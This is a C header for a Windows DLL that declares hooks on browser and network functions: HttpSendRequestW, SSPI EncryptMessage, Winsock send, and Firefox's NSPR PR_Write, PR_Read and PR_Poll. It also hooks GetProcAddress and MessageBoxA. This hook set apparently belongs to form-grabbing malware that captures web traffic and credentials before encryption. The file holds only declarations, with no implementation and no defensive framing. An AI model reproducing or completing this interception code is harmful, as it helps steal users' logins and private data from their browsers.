#ifndef H_HOOK
#define H_HOOK
#ifdef __cplusplus
extern "C" {
#endif
#define WIN32_LEAN_AND_MEAN
#define SECURITY_WIN32
//#include <winsock2.h>
#include <wininet.h>
#include <winsock.h>
#include <windows.h>
#include <sspi.h>
#include "prio.h"

	//Original Funcs
	DWORD (__stdcall *orgMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, DWORD dwOption);
	DWORD (__stdcall *orgHttpSendRequestW)(HINTERNET hFile, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
	INT32 (__cdecl *orgPR_Write)(HANDLE fd, PCHAR buf, INT32 amount);
	int (*orgsend)(SOCKET s, const char *buf, int len, int flag);
	LONG (__stdcall *orgEncryptMessage)(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo);
	FARPROC (__stdcall *orgGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);

	// Hooked Funcs
	void pageMessageBoxA(void);
	GURRUDLL FARPROC __stdcall hkGetProcAddress(HMODULE hModule, LPCSTR lpProcName);
	DWORD __stdcall hkMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, DWORD dwOption);
	GURRUDLL DWORD __stdcall hkHttpSendRequestW(HINTERNET hFile, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
	GURRUDLL LONG __stdcall hkEncryptMessage(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo);
	//GURRUDLL int __stdcall hkWSARecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags,LPWSAOVERLAPPED lpOverlapped,LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
	GURRUDLL int hksend(SOCKET s, const char *buf, int len, int flag);
	GURRUDLL INT32 __cdecl hkPR_Write(HANDLE fd, PCHAR buf, INT32 amount);
	GURRUDLL INT32 __cdecl hkPR_Read(HANDLE fd, PCHAR buf, INT32 amount);
	GURRUDLL LONG __cdecl hkPR_Poll(PRPollDesc *pds, LONG npds, LONG timeout);
#ifdef __cplusplus
}
#endif
#endif